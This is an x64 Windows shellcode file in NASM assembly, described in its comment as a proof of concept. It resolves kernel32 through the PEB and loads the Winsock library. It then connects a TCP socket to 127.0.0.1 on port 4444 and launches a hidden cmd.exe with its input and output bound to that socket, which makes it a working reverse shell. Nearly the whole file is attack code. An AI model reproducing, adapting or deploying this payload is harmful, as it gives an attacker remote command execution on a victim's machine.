BITS 64

; It's important to note, not all kernel32.dll are alike.
; The last update to kernel32.dll with new functions was
; in 2019, and this could change at any given time. If a
; user does not have an up-to-date Windows machine, this
; shellcode could very well not work. These are merely
; POCs as to what can be done in assembly.

get_kernel32:
    mov   rax,   gs:[0x60]
    mov   rax,   [rax + 0x18]
    mov   rax,   [rax + 0x30]
    mov   rax,   [rax]
    mov   rax,   [rax]
    mov   rbp,   [rax + 0x10]

get_createprocess:
    lea   r15,   [rbp + 0x44F70]

get_loadlibrary:
    lea   r14,   [rbp + 0x42D80]

load_ws2_32:
    push  0x006c6c
    mov   rax,   0x642e32335f327377
    push  rax
    mov   rcx,   rsp
    sub   rsp,   0x28
    call  r14

get_wsa_startup:
    lea   r14,   [rax + 0x26E0]

get_wsa_socket:
    lea   r13,   [rax + 0x2BA40]

get_connect:
    lea   r12,   [rax + 0x5F50]

call_wsa_startup:
    xor   rcx,   rcx
    sub   rsp,   0x1F0
    lea   rdx,   [rsp + 0x30]
    mov   cx,    0x202
    call  r14

call_wsa_socket:
    xor   rcx,   rcx
    mov   cl,    0x2
    xor   rdx,   rdx
    mov   dl,    0x1
    xor   r8,    r8
    mov   r8b,   0x6
    xor   r9,    r9
    mov   [rsp + 0x20], r9
    mov   [rsp + 0x28], r9
    call  r13
    mov   r14,   rax

call_connect:
    sub   rsp,   0x28
    xor   rax,   rax
    push  rax
    mov   rax,   0x0100007F5C110002
    push  rax
    mov   rdx,   rsp
    mov   rcx,   r14
    mov   r8b,   0x10
    sub   rsp,   0x10
    call  r12
    add   rsp,   0x38

call_createprocess:
    mov   rax,   0x6578652e646d63
    push  rax
    mov   rdx,   rsp
    push  r14
    push  r14
    push  r14
    xor   rcx,   rcx
    push  cx
    push  rcx
    push  rcx
    mov   cx,    0x0100
    push  cx
    xor   rcx,   rcx
    push  cx
    push  cx
    push  rcx
    push  rcx
    push  rcx
    push  rcx
    push  rcx
    push  rcx
    push  0x68
    mov   rdi,   rsp
    lea   rcx,   [rsp - 0x20]
    push  rcx
    push  rdi
    xor   rcx,   rcx
    push  rcx
    push  rcx
    push  0x08000000
    push  1
    push  rcx
    push  rcx
    push  rcx
    push  rcx
    mov   r8,    rcx
    call  r15